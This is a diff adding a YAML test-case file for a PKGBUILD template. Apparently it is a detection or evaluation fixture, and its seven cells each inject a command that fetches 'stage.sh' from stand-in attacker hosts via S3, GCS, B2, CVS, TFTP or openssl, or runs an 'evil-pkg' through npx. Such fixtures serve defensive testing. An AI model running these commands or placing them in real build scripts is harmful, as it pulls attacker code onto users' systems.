@@ -1,0 +1,30 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    p1: |2
+        aws s3 cp s3://evil-bucket/stage.sh .
+  id: 001-aws-s3
+- vars:
+    p1: |2
+        gsutil cp gs://evil-bucket/stage.sh .
+  id: 002-gsutil
+- vars:
+    p1: |2
+        b2 download-file-by-name evil-bucket stage.sh
+  id: 003-b2
+- vars:
+    p1: |2
+        cvs -d :pserver:u@evil.example:/repo co stage.sh
+  id: 004-cvs
+- vars:
+    p1: |2
+        tftp evil.example -c get stage.sh
+  id: 005-tftp
+- vars:
+    p1: |2
+        openssl s_client -connect evil.example:443 -quiet < req.txt > stage.sh
+  id: 006-openssl
+- vars:
+    p1: |2
+        npx --yes evil-pkg@latest
+  id: 007-npx
